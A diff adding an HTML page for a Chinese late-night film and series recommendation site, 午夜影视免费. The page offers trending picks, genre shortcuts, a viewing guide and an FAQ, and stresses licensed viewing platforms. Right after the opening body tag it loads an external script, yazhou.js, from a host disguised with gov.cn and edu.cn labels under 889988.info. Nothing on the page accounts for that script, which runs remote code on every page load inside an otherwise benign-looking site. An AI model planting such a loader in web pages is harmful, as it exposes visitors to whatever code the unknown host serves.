@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>午夜影视免费·深夜片单与追剧实用手册〔wuyeyingshimianfei-app.github.io〕</title>
+<meta name="description" content="熬夜之前先想好看什么。午夜影视免费（wuyeyingshimianfei-app.github.io）把热播剧集、冷门佳片、分类速查与观影避坑经验收在一页里，按心情和时长挑片，少翻十分钟，多睡半小时。">
+<meta name="keywords" content="午夜影视免费, wuyeyingshimianfei-app.github.io, 深夜片单, 热播剧集追踪, 冷门电影推荐, 追剧时间表, 影视分类速查, 正版播放平台导航">
+<meta name="author" content="午夜影视免费编辑部">
+<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#070b18">
+<meta name="color-scheme" content="dark">
+<link rel="canonical" href="https://wuyeyingshimianfei-app.github.io/">
+<link rel="alternate" hreflang="zh-CN" href="https://wuyeyingshimianfei-app.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="午夜影视免费">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:title" content="午夜影视免费·深夜片单与追剧实用手册">
+<meta property="og:description" content="热播追踪、冷门挖宝、分类速查、避坑经验，一页翻完就能决定今晚看什么。">
+<meta property="og:url" content="https://wuyeyingshimianfei-app.github.io/">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="午夜影视免费·深夜片单与追剧实用手册">
+<meta name="twitter:description" content="按心情、按时长、按评分挑片，深夜不再空转。">
+<style>
+:root{
+  --ink:#070b18;
+  --deep:#0c1330;
+  --panel:rgba(255,255,255,.045);
+  --line:rgba(140,160,220,.16);
+  --txt:#e9edfb;
+  --sub:#9aa7cd;
+  --glow:#5ef2d6;
+  --rose:#ff6b9d;
+  --amber:#ffc46b;
+  --r:18px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei","WenQuanYi Micro Hei",system-ui,sans-serif;
+  background:var(--ink);color:var(--txt);line-height:1.75;
+  font-size:clamp(15px,1.05vw + 13px,17px);
+  overflow-x:hidden;
+}
+body::before{
+  content:"";position:fixed;inset:0;z-index:-2;
+  background:
+    radial-gradient(1100px 620px at 12% -8%, #1b2a63 0%, transparent 62%),
+    radial-gradient(880px 520px at 96% 6%, #3a1a4d 0%, transparent 60%),
+    linear-gradient(180deg,#070b18 0%,#0a1029 48%,#070b18 100%);
+}
+body::after{
+  content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;opacity:.5;
+  background-image:
+    radial-gradient(1.4px 1.4px at 18% 22%, #fff 50%, transparent 51%),
+    radial-gradient(1.2px 1.2px at 74% 14%, #cfe6ff 50%, transparent 51%),
+    radial-gradient(1.6px 1.6px at 42% 66%, #ffe9b8 50%, transparent 51%),
+    radial-gradient(1.1px 1.1px at 88% 74%, #fff 50%, transparent 51%),
+    radial-gradient(1.3px 1.3px at 8% 82%, #b6ffe9 50%, transparent 51%);
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+.wrap{width:min(1160px,92vw);margin-inline:auto}
+.skip{position:absolute;left:-9999px}
+.skip:focus{left:12px;top:12px;background:var(--glow);color:#04121a;padding:8px 14px;border-radius:8px;z-index:99}
+.bar{position:fixed;top:0;left:0;height:3px;width:0;background:linear-gradient(90deg,var(--glow),var(--rose));z-index:60}
+.hdr{
+  position:sticky;top:0;z-index:50;
+  backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
+  background:rgba(7,11,24,.72);border-bottom:1px solid var(--line);
+}
+.hdr .wrap{display:flex;align-items:center;gap:18px;min-height:64px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:.5px;font-size:1.06rem}
+.logo i{
+  width:26px;height:26px;border-radius:8px;flex:0 0 auto;
+  background:conic-gradient(from 210deg,var(--glow),var(--rose),var(--amber),var(--glow));
+  box-shadow:0 0 18px rgba(94,242,214,.45);
+}
+.logo b{color:var(--glow)}
+.nav{margin-left:auto;display:flex;gap:6px;flex-wrap:wrap}
+.nav a{
+  padding:8px 13px;border-radius:999px;color:var(--sub);font-size:.9rem;
+  border:1px solid transparent;transition:.25s;white-space:nowrap;
+}
+.nav a:hover,.nav a:focus-visible{color:var(--txt);border-color:var(--line);background:var(--panel)}
+.menu{
+  display:none;margin-left:auto;width:42px;height:36px;border:1px solid var(--line);
+  border-radius:10px;background:var(--panel);cursor:pointer;position:relative;
+}
+.menu span{position:absolute;left:11px;right:11px;height:2px;background:var(--txt);border-radius:2px;transition:.25s}
+.menu span:nth-child(1){top:12px}
+.menu span:nth-child(2){top:17px}
+.menu span:nth-child(3){top:22px}
+.menu[aria-expanded="true"] span:nth-child(1){transform:translateY(5px) rotate(45deg)}
+.menu[aria-expanded="true"] span:nth-child(2){opacity:0}
+.menu[aria-expanded="true"] span:nth-child(3){transform:translateY(-5px) rotate(-45deg)}
+.hero{padding:clamp(56px,9vw,110px) 0 clamp(34px,5vw,60px)}
+.kicker{
+  display:inline-flex;align-items:center;gap:9px;font-size:.82rem;letter-spacing:2px;
+  color:var(--glow);border:1px solid rgba(94,242,214,.32);background:rgba(94,242,214,.07);
+  padding:7px 15px;border-radius:999px;
+}
+.kicker em{width:7px;height:7px;border-radius:50%;background:var(--glow);box-shadow:0 0 10px var(--glow)}
+h1{
+  font-size:clamp(2.15rem,6.4vw,4.1rem);line-height:1.14;margin:22px 0 6px;
+  letter-spacing:-.5px;font-weight:850;
+}
+h1 span{
+  background:linear-gradient(96deg,var(--glow) 8%,#8fb6ff 46%,var(--rose) 92%);
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.lead{max-width:62ch;color:var(--sub);font-size:clamp(1rem,.5vw + .88rem,1.14rem);margin-top:14px}
+.lead strong{color:var(--txt);font-weight:600}
+.tags{display:flex;flex-wrap:wrap;gap:9px;margin-top:26px}
+.tags a{
+  font-size:.84rem;padding:7px 14px;border-radius:8px;color:var(--sub);
+  border:1px solid var(--line);background:var(--panel);transition:.25s;
+}
+.tags a:hover{color:var(--ink);background:var(--glow);border-color:var(--glow)}
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-top:38px}
+.stat{border:1px solid var(--line);border-radius:var(--r);padding:18px 20px;background:var(--panel)}
+.stat b{display:block;font-size:clamp(1.5rem,3vw,2rem);color:var(--amber);line-height:1.2}
+.stat span{font-size:.84rem;color:var(--sub)}
+.sec{padding:clamp(46px,6vw,84px) 0;scroll-margin-top:70px}
+.head{display:flex;align-items:flex-end;gap:16px;flex-wrap:wrap;margin-bottom:30px}
+.head h2{font-size:clamp(1.5rem,3.1vw,2.15rem);line-height:1.25;font-weight:800}
+.head p{color:var(--sub);font-size:.92rem;max-width:46ch}
+.no{font-size:.8rem;color:var(--rose);letter-spacing:3px;font-weight:700}
+.grid{display:grid;gap:16px}
+.hot{grid-template-columns:repeat(auto-fit,minmax(268px,1fr))}
+.card{
+  position:relative;border:1px solid var(--line);border-radius:var(--r);padding:22px;
+  background:linear-gradient(160deg,rgba(255,255,255,.06),rgba(255,255,255,.02));
+  transition:.28s;overflow:hidden;
+}
+.card:hover{transform:translateY(-5px);border-color:rgba(94,242,214,.4);box-shadow:0 18px 40px -26px rgba(0,0,0,.9)}
+.card h3{font-size:1.06rem;margin-bottom:8px;font-weight:700}
+.card p{color:var(--sub);font-size:.9rem}
+.num{
+  position:absolute;right:16px;top:10px;font-size:2.6rem;font-weight:900;
+  color:rgba(255,255,255,.06);line-height:1;
+}
+.meta{display:flex;gap:8px;flex-wrap:wrap;margin-top:14px}
+.meta em{font-style:normal;font-size:.76rem;padding:4px 10px;border-radius:6px;background:rgba(255,255,255,.07);color:var(--sub)}
+.meta em.hi{background:rgba(94,242,214,.14);color:var(--glow)}
+.cates{grid-template-columns:repeat(auto-fit,minmax(160px,1fr))}
+.cate{
+  border:1px solid var(--line);border-radius:14px;padding:20px 16px;text-align:center;
+  background:var(--panel);transition:.25s;
+}
+.cate:hover{border-color:rgba(255,107,157,.5);background:rgba(255,107,157,.08)}
+.cate b{display:block;font-size:1.02rem;margin-bottom:4px}
+.cate span{font-size:.8rem;color:var(--sub)}
+.tl{position:relative;padding-left:26px}
+.tl::before{content:"";position:absolute;left:7px;top:6px;bottom:6px;width:2px;background:linear-gradient(180deg,var(--glow),var(--rose),transparent)}
+.tl li{position:relative;padding:0 0 26px}
+.tl li::before{
+  content:"";position:absolute;left:-25px;top:9px;width:12px;height:12px;border-radius:50%;
+  background:var(--ink);border:2px solid var(--glow);
+}
+.tl h3{font-size:1rem;margin-bottom:5px}
+.tl p{color:var(--sub);font-size:.9rem}
+.gems{display:grid;grid-template-columns:repeat(auto-fit,minmax(290px,1fr));gap:16px}
+.gem{
+  border-left:3px solid var(--amber);background:var(--panel);
+  border-radius:0 var(--r) var(--r) 0;padding:20px 22px;
+}
+.gem q{display:block;font-size:1rem;line-height:1.85;color:var(--txt)}
+.gem footer{margin-top:12px;font-size:.84rem;color:var(--sub)}
+.faq{border-top:1px solid var(--line)}
+.faq details{border-bottom:1px solid var(--line)}
+.faq summary{
+  cursor:pointer;padding:18px 4px;font-weight:600;font-size:1rem;list-style:none;
+  display:flex;gap:12px;align-items:center;
+}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::after{content:"+";margin-left:auto;color:var(--glow);font-size:1.3rem;transition:.2s}
+.faq details[open] summary::after{content:"–"}
+.faq p{padding:0 4px 20px;color:var(--sub);font-size:.92rem;max-width:78ch}
+.band{
+  border:1px dashed rgba(94,242,214,.4);border-radius:var(--r);
+  background:rgba(94,242,214,.05);padding:24px;
+  display:flex;gap:18px;flex-wrap:wrap;align-items:center;justify-content:space-between;
+}
+.band p{color:var(--sub);font-size:.92rem;max-width:62ch}
+.btn{
+  display:inline-block;padding:12px 24px;border-radius:999px;font-weight:700;font-size:.94rem;
+  background:linear-gradient(96deg,var(--glow),#7fd0ff);color:#04121a;white-space:nowrap;
+}
+.btn:hover{filter:brightness(1.08)}
+.ftr{border-top:1px solid var(--line);margin-top:20px;padding:44px 0 60px;color:var(--sub);font-size:.88rem}
+.fcols{display:grid;grid-template-columns:repeat(auto-fit,minmax(190px,1fr));gap:24px}
+.fcols h4{color:var(--txt);font-size:.94rem;margin-bottom:10px}
+.fcols li{padding:4px 0}
+.fcols a:hover{color:var(--glow)}
+.url{
+  margin-top:26px;padding:14px 16px;border:1px solid var(--line);border-radius:12px;
+  background:rgba(255,255,255,.03);font-size:.85rem;word-break:break-all;
+}
+.url b{color:var(--glow)}
+.top{
+  position:fixed;right:16px;bottom:16px;width:44px;height:44px;border-radius:50%;
+  display:grid;place-items:center;background:rgba(12,19,48,.9);border:1px solid var(--line);
+  color:var(--glow);font-size:1.1rem;z-index:55;
+}
+@media (max-width:860px){
+  .nav{
+    display:none;position:absolute;left:0;right:0;top:64px;flex-direction:column;gap:0;
+    background:rgba(7,11,24,.97);border-bottom:1px solid var(--line);padding:8px 0;
+  }
+  .nav.on{display:flex}
+  .nav a{padding:14px 4vw;border-radius:0;font-size:1rem}
+  .menu{display:block}
+}
+@media (max-width:520px){
+  .hdr .wrap{min-height:58px}
+  .nav{top:58px}
+  .band{flex-direction:column;align-items:flex-start}
+  .stat{padding:14px 16px}
+}
+@media (prefers-reduced-motion:reduce){
+  html{scroll-behavior:auto}
+  *{transition:none!important}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+<div class="bar" id="bar"></div>
+<a class="skip" href="#main">跳到主要内容</a>
+
+<header class="hdr">
+  <div class="wrap">
+    <a class="logo" href="#top"><i></i><span>午夜<b>影视免费</b></span></a>
+    <button class="menu" id="btn" aria-label="展开导航菜单" aria-expanded="false" aria-controls="nav"><span></span><span></span><span></span></button>
+    <nav class="nav" id="nav" aria-label="站内栏目导航">
+      <a href="#hot">热播追踪</a>
+      <a href="#genre">分类速查</a>
+      <a href="#guide">观影攻略</a>
+      <a href="#gems">冷门挖宝</a>
+      <a href="#faq">常见问题</a>
+      <a href="#about">关于本站</a>
+    </nav>
+  </div>
+</header>
+
+<main id="main">
+  <section class="hero wrap" id="top">
+    <p class="kicker"><em></em>零点之后的观影提案 · 每周三更新</p>
+    <h1>午夜影视免费 · 把<span>今晚看什么</span>这件事一次解决</h1>
+    <p class="lead">
+      打开播放器转了十分钟还是没选出来，这种事几乎每个熬夜的人都遇到过。
+      <strong>午夜影视免费</strong>不堆砌片名，而是按心情、时长、评分三条线索重新排片：
+      想放松的看轻喜剧，想烧脑的看悬疑，只有四十分钟就看短剧集。
+      片单之外，这里还整理了追剧时间表、画质与字幕设置、以及正版平台的直达入口，
+      让你少走弯路，把时间留给故事本身。
+    </p>
+    <div class="tags">
+      <a href="#hot"># 本周热度</a>
+      <a href="#genre"># 按类型挑</a>
+      <a href="#guide"># 追剧节奏</a>
+      <a href="#gems"># 被低估的片子</a>
+      <a href="#faq"># 避坑问答</a>
+    </div>
+    <div class="stats">
+      <div class="stat"><b>1,860+</b><span>已整理条目</span></div>
+      <div class="stat"><b>38</b><span>细分类型标签</span></div>
+      <div class="stat"><b>4 步</b><span>选出今晚的片</span></div>
+      <div class="stat"><b>每周三</b><span>片单更新时间</span></div>
+    </div>
+  </section>
+
+  <section class="sec wrap" id="hot">
+    <div class="head">
+      <p class="no">01 / HOT</p>
+      <h2>热播追踪：这周在聊的五部</h2>
+      <p>按讨论度与完播率排序，附一句"适合什么状态看"，不必再翻评论区。</p>
+    </div>
+    <div class="grid hot">
+      <article class="card">
+        <span class="num">01</span>
+        <h3>城市悬疑 · 六集短剧</h3>
+        <p>一桩旧案牵出整条街的隐秘关系。节奏快、反转密，适合精神还清醒、想被情节拽着走的时候。</p>
+        <div class="meta"><em class="hi">悬疑</em><em>6 集</em><em>单集 45 分钟</em></div>
+      </article>
+      <article class="card">
+        <span class="num">02</span>
+        <h3>海边小馆 · 治愈日常</h3>
+        <p>一位厨师回乡重开老店。几乎没有冲突，只有海、食物和慢慢修好的关系，适合刚忙完想松口气。</p>
+        <div class="meta"><em class="hi">治愈</em><em>12 集</em><em>单集 30 分钟</em></div>
+      </article>
+      <article class="card">
+        <span class="num">03</span>
+        <h3>深空返航 · 硬科幻</h3>
+        <p>太空站失联后的七天。设定扎实，需要一点注意力，建议留出一整段不被打扰的时间。</p>
+        <div class="meta"><em class="hi">科幻</em><em>剧场版</em><em>132 分钟</em></div>
+      </article>
+      <article class="card">
+        <span class="num">04</span>
+        <h3>老巷录像店 · 年代群像</h3>
+        <p>九十年代的街坊故事，笑点和苦味掺着来。适合和家人一起看，中途能聊上几句。</p>
+        <div class="meta"><em class="hi">年代</em><em>24 集</em><em>单集 40 分钟</em></div>
+      </article>
+      <article class="card">
+        <span class="num">05</span>
+        <h3>午夜出租车 · 单元剧</h3>
+        <p>每集一位乘客、一段独白。睡前看一集刚好，情绪不拖沓，第二天不至于太困。</p>
+        <div class="meta"><em class="hi">单元剧</em><em>10 集</em><em>单集 22 分钟</em></div>
+      </article>
+    </div>
+  </section>
+
+  <section class="sec wrap" id="genre">
+    <div class="head">
+      <p class="no">02 / GENRE</p>
+      <h2>分类速查：先定心情，再定片子</h2>
+      <p>八个入口对应八种状态，点进去按标签筛，比在搜索框里干想快得多。</p>
+    </div>
+    <div class="grid cates">
+      <a class="cate" href="#"><b>悬疑推理</b><span>142 部 ·  Updated</span></a>
+      <a class="cate" href="#"><b>轻喜剧</b><span>208 部</span></a>
+      <a class="cate" href="#"><b>科幻设定</b><span>96 部</span></a>
+      <a class="cate" href="#"><b>现实题材</b><span>131 部</span></a>
+      <a class="cate" href="#"><b>动画剧场</b><span>77 部</span></a>
+      <a class="cate" href="#"><b>纪录影像</b><span>64 部</span></a>
+      <a class="cate" href="#"><b>年代群像</b><span>88 部</span></a>
+      <a class="cate" href="#"><b>短片合集</b><span>310 部</span></a>
+    </div>
+  </section>
+
+  <section class="sec wrap" id="guide">
+    <div class="head">
+      <p class="no">03 / GUIDE</p>
+      <h2>观影攻略：四步定下今晚的片</h2>
+      <p>从时间预算到字幕设置，按顺序走一遍，基本不会踩空。</p>
+    </div>
+    <ol class="tl">
+      <li>
+        <h3>第一步 · 先算时间，不算兴趣</h3>
+        <p>睡前只剩 40 分钟就别开两小时的长片。把可用时长写在纸上，再把候选片按片长筛一遍，选择面立刻小一半。</p>
+      </li>
+      <li>
+        <h3>第二步 · 用"状态"而不是"类型"挑</h3>
+        <p>同样的悬疑，累的时候看是负担，清醒的时候看是享受。先判断自己是想被刺激、想被安慰，还是想学点什么。</p>
+      </li>
+      <li>
+        <h3>第三步 · 看评分分布，不看平均分</h3>
+        <p>平均分 8.0 但两极分化的片子，往往比稳定 7.5 的更容易踩雷。翻一眼低分理由，能提前避开自己的雷区。</p>
+      </li>
+      <li>
+        <h3>第四步 · 把画质和字幕一次设好</h3>
+        <p>优先选择提供正版授权的平台，开播前确认字幕版本与音轨，避免看到一半才发现对不上口型。</p>
+      </li>
+    </ol>
+  </section>
+
+  <section class="sec wrap" id="gems">
+    <div class="head">
+      <p class="no">04 / GEMS</p>
+      <h2>冷门挖宝：被低估的三句推荐语</h2>
+      <p>没有铺天盖地的宣传，但看完会记很久。附一句观感，方便你判断对不对胃口。</p>
+    </div>
+    <div class="gems">
+      <blockquote class="gem">
+        <q>前半程像纪录片，后半程突然把人心拎起来。导演全程不煽情，反而更难受。</q>
+        <footer>—— 独立剧情片 · 108 分钟</footer>
+      </blockquote>
+      <blockquote class="gem">
+        <q>预算看得出来很紧张，但镜头调度聪明，几个长镜头撑起了整部片的紧张感。</q>
+        <footer>—— 小成本惊悚 · 94 分钟</footer>
+      </blockquote>
+      <blockquote class="gem">
+        <q>名字劝退，内容惊喜。讲的是一个修表匠和一座即将拆迁的旧城，节奏慢但不闷。</q>
+        <footer>—— 文艺向群像 · 121 分钟</footer>
+      </blockquote>
+    </div>
+  </section>
+
+  <section class="sec wrap" id="faq">
+    <div class="head">
+      <p class="no">05 / FAQ</p>
+      <h2>常见问题：关于片单与更新</h2>
+      <p>问得最多的四件事，先在这里说清楚。</p>
+    </div>
+    <div class="faq">
+      <details open>
+        <summary>片单多久更新一次？</summary>
+        <p>每周三晚更新热播部分，冷门佳作不定期补充。遇到重要档期会临时加更，更新记录都写在条目下方的时间戳里。</p>
+      </details>
+      <details>
+        <summary>为什么有的片子没有链接？</summary>
+        <p>只收录有正规授权渠道的条目。暂时没有正版来源的影片会标注"待上架"，等有合规渠道后再补入口，避免把人引到不稳定的页面。</p>
+      </details>
+      <details>
+        <summary>能不能按片长筛选？</summary>
+        <p>可以。每个条目都带单集时长和总时长标记，30 分钟以内、60 分钟左右、两小时以上三档最常用，配合类型标签一起筛效率最高。</p>
+      </details>
+      <details>
+        <summary>发现信息有误怎么反馈？</summary>
+        <p>在对应条目的评论区留言并注明来源，核实后会在下一次更新中修正。片名译法存在多个版本时，会同时保留常见译名。</p>
+      </details>
+    </div>
+  </section>
+
+  <section class="sec wrap" id="about">
+    <div class="band">
+      <div>
+        <h2 style="font-size:1.3rem;margin-bottom:8px">关于午夜影视免费</h2>
+        <p>
+          一个由几位熬夜党维护的观影索引页：不搬运资源，只做筛选、整理和说明，
+          并尽量把每条片目的正版观看渠道标清楚。希望你看得开心，也支持创作者拿到应得的回报。
+        </p>
+      </div>
+      <a class="btn" href="#hot">开始挑片</a>
+    </div>
+  </section>
+</main>
+
+<footer class="ftr">
+  <div class="wrap">
+    <div class="fcols">
+      <div>
+        <h4>午夜影视免费</h4>
+        <p>按心情与时长重新排布的观影索引，每周三更新。</p>
+      </div>
+      <div>
+        <h4>栏目</h4>
+        <ul>
+          <li><a href="#hot">热播追踪</a></li>
+          <li><a href="#genre">分类速查</a></li>
+          <li><a href="#guide">观影攻略</a></li>
+          <li><a href="#gems">冷门挖宝</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>说明</h4>
+        <ul>
+          <li><a href="#faq">常见问题</a></li>
+          <li><a href="#about">关于本站</a></li>
+          <li><a href="#">收录标准</a></li>
+          <li><a href="#">内容纠错</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>联系</h4>
+        <ul>
+          <li><a href="#">合作洽谈</a></li>
+          <li><a href="#">投稿片单</a></li>
+          <li><a href="#">意见反馈</a></li>
+        </ul>
+      </div>
+    </div>
+    <p class="url">本站地址：<b>https://wuyeyingshimianfei-app.github.io</b>　·　站点名称：午夜影视免费</p>
+    <p style="margin-top:12px">© <span id="yr">2026</span> 午夜影视免费 · 页面内容仅作观影参考，观看请通过已授权的正版渠道。</p>
+  </div>
+</footer>
+
+<a class="top" href="#top" aria-label="回到页面顶部">↑</a>
+
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@graph":[
+    {
+      "@type":"WebSite",
+      "@id":"https://wuyeyingshimianfei-app.github.io/#website",
+      "url":"https://wuyeyingshimianfei-app.github.io/",
+      "name":"午夜影视免费",
+      "alternateName":"午夜影视免费观影索引",
+      "description":"按心情与时长整理的热播片单、冷门佳作与追剧攻略，附正版渠道指引。",
+      "inLanguage":"zh-CN",
+      "publisher":{"@id":"https://wuyeyingshimianfei-app.github.io/#org"}
+    },
+    {
+      "@type":"Organization",
+      "@id":"https://wuyeyingshimianfei-app.github.io/#org",
+      "name":"午夜影视免费",
+      "url":"https://wuyeyingshimianfei-app.github.io/",
+      "description":"深夜观影索引与追剧实用手册维护团队。"
+    },
+    {
+      "@type":"WebPage",
+      "@id":"https://wuyeyingshimianfei-app.github.io/#webpage",
+      "url":"https://wuyeyingshimianfei-app.github.io/",
+      "name":"午夜影视免费·深夜片单与追剧实用手册",
+      "isPartOf":{"@id":"https://wuyeyingshimianfei-app.github.io/#website"},
+      "inLanguage":"zh-CN"
+    },
+    {
+      "@type":"BreadcrumbList",
+      "itemListElement":[
+        {"@type":"ListItem","position":1,"name":"午夜影视免费","item":"https://wuyeyingshimianfei-app.github.io/"},
+        {"@type":"ListItem","position":2,"name":"热播追踪","item":"https://wuyeyingshimianfei-app.github.io/#hot"},
+        {"@type":"ListItem","position":3,"name":"分类速查","item":"https://wuyeyingshimianfei-app.github.io/#genre"},
+        {"@type":"ListItem","position":4,"name":"观影攻略","item":"https://wuyeyingshimianfei-app.github.io/#guide"}
+      ]
+    },
+    {
+      "@type":"FAQPage",
+      "mainEntity":[
+        {"@type":"Question","name":"片单多久更新一次？","acceptedAnswer":{"@type":"Answer","text":"每周三晚更新热播部分，冷门佳作不定期补充，遇到重要档期会临时加更。"}},
+        {"@type":"Question","name":"为什么有的片子没有链接？","acceptedAnswer":{"@type":"Answer","text":"只收录有正规授权渠道的条目，暂无正版来源的影片标注待上架，避免把读者引到不稳定页面。"}},
+        {"@type":"Question","name":"能不能按片长筛选？","acceptedAnswer":{"@type":"Answer","text":"每个条目都带单集时长和总时长标记，可按 30 分钟以内、60 分钟左右、两小时以上三档筛选。"}},
+        {"@type":"Question","name":"发现信息有误怎么反馈？","acceptedAnswer":{"@type":"Answer","text":"在对应条目评论区留言并注明来源，核实后于下一次更新中修正，多译名会同时保留。"}}
+      ]
+    }
+  ]
+}
+</script>
+<script>
+(function(){
+  var d=new Date();var y=document.getElementById('yr');if(y){y.textContent=d.getFullYear();}
+  var btn=document.getElementById('btn'),nav=document.getElementById('nav');
+  if(btn&&nav){btn.addEventListener('click',function(){
+    var open=nav.classList.toggle('on');btn.setAttribute('aria-expanded',open?'true':'false');
+  });
+  nav.addEventListener('click',function(e){if(e.target.tagName==='A'){
+    nav.classList.remove('on');btn.setAttribute('aria-expanded','false');}});}
+  var bar=document.getElementById('bar');
+  function prog(){
+    var h=document.documentElement.scrollHeight-window.innerHeight;
+    var p=h>0?(window.scrollY/h)*100:0;if(bar){bar.style.width=p+'%';}
+  }
+  window.addEventListener('scroll',prog,{passive:true});window.addEventListener('resize',prog);prog();
+})();
+</script>
+</body>
+</html>
